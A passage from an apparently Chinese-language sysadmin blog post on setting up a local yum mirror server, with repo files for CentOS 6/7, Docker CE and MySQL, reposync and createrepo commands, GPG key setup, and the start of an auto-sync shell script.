docker-ce.repo.bakCOPY</span><br></code></pre></td></tr></table></figure><h3 id="3、根据阿里云repo文件创建CentOS6的yum源文件"><a href="#3、根据阿里云repo文件创建CentOS6的yum源文件" class="headerlink" title="3、根据阿里云repo文件创建CentOS6的yum源文件"></a>3、根据阿里云repo文件创建CentOS6的yum源文件</h3><p>文件内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># cat Centos-6.repo.bak </span><br><span class="hljs-comment"># CentOS-Base.repo</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The mirror system uses the connecting IP address of the client and the</span><br><span class="hljs-comment"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="hljs-comment"># geographically close to the client. You should use this for CentOS updates</span><br><span class="hljs-comment"># unless you are manually picking other mirrors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="hljs-comment"># remarked out baseurl= line instead.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><br>[base]<br>name=CentOS-6-Base-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/6/os/x86_64/<br>http://mirrors.aliyuncs.com/centos/6/os/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os</span><br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br><br><span class="hljs-comment">#released updates </span><br>[updates]<br>name=CentOS-6-Updates-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/6/updates/x86_64/<br>http://mirrors.aliyuncs.com/centos/6/updates/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates</span><br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br><br><span class="hljs-comment">#additional packages that may be useful</span><br>[extras]<br>name=CentOS-6-Extras-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/6/extras/x86_64/<br>http://mirrors.aliyuncs.com/centos/6/extras/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras</span><br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br><br><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><br>[centosplus]<br>name=CentOS-6-Plus-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/6/centosplus/x86_64/<br>http://mirrors.aliyuncs.com/centos/6/centosplus/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus</span><br>gpgcheck=1<br>enabled=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br><br><span class="hljs-comment">#contrib - packages by Centos Users</span><br>[contrib]<br>name=CentOS-6-Contrib-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/6/contrib/x86_64/<br>http://mirrors.aliyuncs.com/centos/6/contrib/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=contrib</span><br>gpgcheck=1<br>enabled=0<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6COPY<br></code></pre></td></tr></table></figure><h3 id="4、创建CentOS7的yum源文件"><a href="#4、创建CentOS7的yum源文件" class="headerlink" title="4、创建CentOS7的yum源文件"></a>4、创建CentOS7的yum源文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># cat Centos-7.repo</span><br><span class="hljs-comment"># CentOS-Base.repo</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The mirror system uses the connecting IP address of the client and the</span><br><span class="hljs-comment"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="hljs-comment"># geographically close to the client. You should use this for CentOS updates</span><br><span class="hljs-comment"># unless you are manually picking other mirrors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="hljs-comment"># remarked out baseurl= line instead.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><br>[base]<br>name=CentOS-7-Base-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/7/os/x86_64/<br>http://mirrors.aliyuncs.com/centos/7/os/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os</span><br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br><br><span class="hljs-comment">#released updates </span><br>[updates]<br>name=CentOS-7-Updates-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/7/updates/x86_64/<br>http://mirrors.aliyuncs.com/centos/7/updates/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates</span><br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br><span class="hljs-comment">#additional packages that may be useful</span><br>[extras]<br>name=CentOS-7-Extras-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/7/extras/x86_64/<br>http://mirrors.aliyuncs.com/centos/7/extras/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras</span><br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><br>[centosplus]<br>name=CentOS-7-Plus-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/7/centosplus/x86_64/<br>http://mirrors.aliyuncs.com/centos/7/centosplus/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus</span><br>gpgcheck=1<br>enabled=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br><span class="hljs-comment">#contrib - packages by Centos Users</span><br>[contrib]<br>name=CentOS-7-Contrib-mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/7/contrib/x86_64/<br>http://mirrors.aliyuncs.com/centos/7/contrib/x86_64/<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=contrib</span><br>gpgcheck=1<br>enabled=0<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7COPY<br></code></pre></td></tr></table></figure><h3 id="5、创建CentOS7上Docker的yum源文件"><a href="#5、创建CentOS7上Docker的yum源文件" class="headerlink" title="5、创建CentOS7上Docker的yum源文件"></a>5、创建CentOS7上Docker的yum源文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># cat docker-ce.repo.bak</span><br>[docker-ce-stable]<br>name=Docker CE Stable - <span class="hljs-variable">$basearch</span><br>baseurl=https://download.docker.com/linux/centos/7/x86_64/stable<br>enabled=1<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-stable-debuginfo]<br>name=Docker CE Stable - Debuginfo <span class="hljs-variable">$basearch</span><br>baseurl=https://download.docker.com/linux/centos/7/debug-x86_64/stable<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-stable-source]<br>name=Docker CE Stable - Sources<br>baseurl=https://download.docker.com/linux/centos/7/source/stable<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-edge]<br>name=Docker CE Edge - <span class="hljs-variable">$basearch</span><br>baseurl=https://download.docker.com/linux/centos/7/x86_64/edge<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-edge-debuginfo]<br>name=Docker CE Edge - Debuginfo <span class="hljs-variable">$basearch</span><br>baseurl=https://download.docker.com/linux/centos/7/debug-x86_64/edge<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-edge-source]<br>name=Docker CE Edge - Sources<br>baseurl=https://download.docker.com/linux/centos/7/source/edge<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-test]<br>name=Docker CE Test - <span class="hljs-variable">$basearch</span><br>baseurl=https://download.docker.com/linux/centos/7/x86_64/test<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-test-debuginfo]<br>name=Docker CE Test - Debuginfo <span class="hljs-variable">$basearch</span><br>baseurl=https://download.docker.com/linux/centos/7/debug-x86_64/test<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpg<br>[docker-ce-test-source]<br>name=Docker CE Test - Sources<br>baseurl=https://download.docker.com/linux/centos/7/source/test<br>enabled=0<br>gpgcheck=1<br>gpgkey=https://download.docker.com/linux/centos/gpgCOPY<br></code></pre></td></tr></table></figure><h3 id="6、创建CentOS7上MySQL的yum源文件"><a href="#6、创建CentOS7上MySQL的yum源文件" class="headerlink" title="6、创建CentOS7上MySQL的yum源文件"></a>6、创建CentOS7上MySQL的yum源文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># cat mysql-community.repo</span><br>[mysql-connectors-community]<br>name=MySQL Connectors Community<br>baseurl=http://repo.mysql.com/yum/mysql-connectors-community/el/7/<span class="hljs-variable">$basearch</span>/<br>enabled=1<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>[mysql-tools-community]<br>name=MySQL Tools Community<br>baseurl=http://repo.mysql.com/yum/mysql-tools-community/el/7/<span class="hljs-variable">$basearch</span>/<br>enabled=1<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br><span class="hljs-comment"># Enable to use MySQL 5.5</span><br>[mysql55-community]<br>name=MySQL 5.5 Community Server<br>baseurl=http://repo.mysql.com/yum/mysql-5.5-community/el/7/<span class="hljs-variable">$basearch</span>/<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br><span class="hljs-comment"># Enable to use MySQL 5.6</span><br>[mysql56-community]<br>name=MySQL 5.6 Community Server<br>baseurl=http://repo.mysql.com/yum/mysql-5.6-community/el/7/<span class="hljs-variable">$basearch</span>/<br>enabled=1<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>[mysql57-community]<br>name=MySQL 5.7 Community Server<br>baseurl=http://repo.mysql.com/yum/mysql-5.7-community/el/7/<span class="hljs-variable">$basearch</span>/<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br><br>[root@Yum-Reporsitory yum.repos.d]<span class="hljs-comment"># cat mysql-community-source.repo</span><br>[mysql-connectors-community-source]<br>name=MySQL Connectors Community - Source<br>baseurl=http://repo.mysql.com/yum/mysql-connectors-community/el/7/SRPMS<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>[mysql-tools-community-source]<br>name=MySQL Tools Community - Source<br>baseurl=http://repo.mysql.com/yum/mysql-tools-community/el/7/SRPMS<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>[mysql55-community-source]<br>name=MySQL 5.5 Community Server - Source<br>baseurl=http://repo.mysql.com/yum/mysql-5.5-community/el/7/SRPMS<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>[mysql56-community-source]<br>name=MySQL 5.6 Community Server - Source<br>baseurl=http://repo.mysql.com/yum/mysql-5.6-community/el/7/SRPMS<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql<br>[mysql57-community-source]<br>name=MySQL 5.7 Community Server - Source<br>baseurl=http://repo.mysql.com/yum/mysql-5.7-community/el/7/SRPMS<br>enabled=0<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysqlCOPY<br></code></pre></td></tr></table></figure><h2 id="同步yum源到本地yum服务器"><a href="#同步yum源到本地yum服务器" class="headerlink" title="同步yum源到本地yum服务器"></a>同步yum源到本地yum服务器</h2><h3 id="1、同步CentOS6的yum源"><a href="#1、同步CentOS6的yum源" class="headerlink" title="1、同步CentOS6的yum源"></a>1、同步CentOS6的yum源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv Centos-6.repo.bak Centos-6.repo</span><br>[root@Yum-Repositories mds]<span class="hljs-comment"># reposync -p /mds/yum/centos6</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv Centos-6.repo Centos-6.repo.bakCOPY</span><br></code></pre></td></tr></table></figure><h3 id="2、同步CentOS7的yum源"><a href="#2、同步CentOS7的yum源" class="headerlink" title="2、同步CentOS7的yum源"></a>2、同步CentOS7的yum源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv Centos-7.repo.bak Centos-7.repo</span><br>[root@Yum-Repositories mds]<span class="hljs-comment"># reposync -p /mds/yum/centos7</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv Centos-7.repo Centos-7.repo.bakCOPY</span><br></code></pre></td></tr></table></figure><h3 id="3、同步CentOS7上Docker的yum源"><a href="#3、同步CentOS7上Docker的yum源" class="headerlink" title="3、同步CentOS7上Docker的yum源"></a>3、同步CentOS7上Docker的yum源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv docker-ce.repo.bak docker-ce.repo</span><br>[root@Yum-Repositories mds]<span class="hljs-comment"># reposync -p /mds/yum/centos7</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv docker-ce.repo docker-ce.repo.bakCOPY</span><br></code></pre></td></tr></table></figure><h3 id="4、同步CentOS7上MySQL的yum源"><a href="#4、同步CentOS7上MySQL的yum源" class="headerlink" title="4、同步CentOS7上MySQL的yum源"></a>4、同步CentOS7上MySQL的yum源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv mysql-community.repo.bak mysql-community.repo</span><br>[root@Yum-Repositories mds]<span class="hljs-comment"># reposync -p /mds/yum/centos7</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv mysql-community.repo mysql-community.repo.bak</span><br><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv mysql-community-source.repo.bak mysql-community-source.repo</span><br>[root@Yum-Repositories mds]<span class="hljs-comment"># reposync -p /mds/yum/centos7</span><br>[root@Yum-Repositories yum.repos.d]<span class="hljs-comment"># mv mysql-community-source.repo mysql-community-source.repo.bakCOPY</span><br></code></pre></td></tr></table></figure><h2 id="创建rpm包依赖库"><a href="#创建rpm包依赖库" class="headerlink" title="创建rpm包依赖库"></a>创建rpm包依赖库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">CentOS6<br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos6/base/Packages/</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos6/extras/Packages/</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos6/updates/Packages/</span><br><br>CentOS7 <br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/base/Packages/</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/extras/Packages/</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/updates/Packages/</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/docker-ce-stable/Packages/</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/mysql56-community</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/mysql-connectors-community</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># createrepo -p /mds/yum/centos7/mysql-tools-communityCOPY</span><br></code></pre></td></tr></table></figure><h2 id="设置Docker的gpgkey文件"><a href="#设置Docker的gpgkey文件" class="headerlink" title="设置Docker的gpgkey文件"></a>设置Docker的gpgkey文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum]<span class="hljs-comment"># pwd</span><br>/mds/yum<br>[root@Yum-Repositories yum]<span class="hljs-comment"># wget https://download.docker.com/linux/centos/gpg</span><br>[root@Yum-Repositories yum]<span class="hljs-comment"># mv gpg RPM-GPG-KEY-Docker</span><br>[root@Yum-Repositories yum]<span class="hljs-comment"># chmod 755 RPM-GPG-KEY-DockerCOPY</span><br></code></pre></td></tr></table></figure><h2 id="设置MySQL的gpgkey文件"><a href="#设置MySQL的gpgkey文件" class="headerlink" title="设置MySQL的gpgkey文件"></a>设置MySQL的gpgkey文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># wget https://repo.mysql.com/mysql-community-release-el7.rpm</span><br>[root@Yum-Repositories ~]<span class="hljs-comment"># rpm -ivh https://repo.mysql.com/mysql-community-release-el7.rpm</span><br>会自动生成mysql的两个repo文件（前文中的mysql-community.repo和mysql-community-source.repo），以及RPM-GPG-KEY-mysql文件<br>[root@Yum-Repositories yum]<span class="hljs-comment"># mv /etc/pki/rpm-gpg/RPM-GPG-KEY-mysql56 /mds/yum/</span><br>[root@Yum-Repositories yum]<span class="hljs-comment"># chmod 755 RPM-GPG-KEY-mysql56COPY</span><br></code></pre></td></tr></table></figure><h2 id="设置目录权限"><a href="#设置目录权限" class="headerlink" title="设置目录权限"></a>设置目录权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories yum]<span class="hljs-comment"># pwd</span><br>/mds/yum<br>[root@Yum-Repositories yum]<span class="hljs-comment"># chmod -R 755 ./* COPY</span><br></code></pre></td></tr></table></figure><h2 id="创建yum源自动更新"><a href="#创建yum源自动更新" class="headerlink" title="创建yum源自动更新"></a>创建yum源自动更新</h2><h3 id="1、创建自动更新脚本"><a href="#1、创建自动更新脚本" class="headerlink" title="1、创建自动更新脚本"></a>1、创建自动更新脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Reporsitory ~]<span class="hljs-comment"># cat auto_update_yum_centos6.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment">#设置日志文件名，以当前日期为后缀</span><br>DATE=`<span class="hljs-built_in">date</span> <span class="hljs-string">&quot;+%Y-%m-%d&quot;</span>`<br>log6=/root/yumsync6.<span class="hljs-built_in">log</span><span class="hljs-variable">$DATE</span><br><span class="hljs-built_in">echo</span> &gt; <span class="hljs-variable">$log6</span><br><span class="hljs-comment">#将/etc/yum.repos.d/目录下的所有repo文件加上.bak的后缀，防止之前执行失败而导致有xxx.repo.bak被改为xxx.repo而没有改回xxx.repo.bak</span><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> /etc/yum.repos.d/*.repo<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">mv</span> <span class="hljs-variable">$file</span> <span class="hljs-variable">$file</span>.bak &gt;&gt; /dev/null 2&gt;&gt; /dev/null<br><span class="hljs-keyword">done</span><br><span class="hljs-comment">#将centos6的repo文件的.bak后缀去除，使之开始生效</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/Centos-6.repo.bak /etc/yum.repos.d/Centos-6.repo<br>yum clean all<br>yum makecache<br><span class="hljs-comment">#同步centos6的包到本地</span><br>reposync -p /mds/yum/centos6 &gt;&gt; <span class="hljs-variable">$log6</span> 2&gt;&gt; <span class="hljs-variable">$log6</span><br><span class="hljs-comment">#为本地rpm包简历yum的索引</span><br>createrepo -p /mds/yum/centos6/base/Packages/ &gt;&gt; <span class="hljs-variable">$log6</span> 2&gt;&gt; <span class="hljs-variable">$log6</span><br>createrepo -p /mds/yum/centos6/extras/Packages/ &gt;&gt; <span class="hljs-variable">$log6</span> 2&gt;&gt; <span class="hljs-variable">$log6</span><br>createrepo -p /mds/yum/centos6/updates/Packages/ &gt;&gt; <span class="hljs-variable">$log6</span> 